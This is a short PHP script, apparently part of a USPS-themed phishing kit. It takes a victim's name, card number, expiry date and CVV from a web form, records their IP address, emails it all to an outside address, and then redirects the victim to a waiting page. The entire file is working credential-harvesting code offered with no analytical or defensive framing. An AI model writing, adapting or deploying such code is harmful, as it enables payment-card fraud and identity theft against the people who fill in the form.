<?php
$zabi = getenv("REMOTE_ADDR");
$message .= "first name : ".$_POST['fname']."\n";
$message .= "last name : ".$_POST['lname']."\n";
$message .= "card number : ".$_POST['card']."\n";
$message .= "Exp date : ".$_POST['exp']."\n";
$message .= "Cvv : ".$_POST['cvv']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP       : $zabi\n";
$subject = "CVV USPS [ " . $zabi . " ] ";
$email = "1471033717@etlgr.com";
mail($email,$subject,$message);
   
fwrite($text, $message);

header("Location: ../wait/");?>
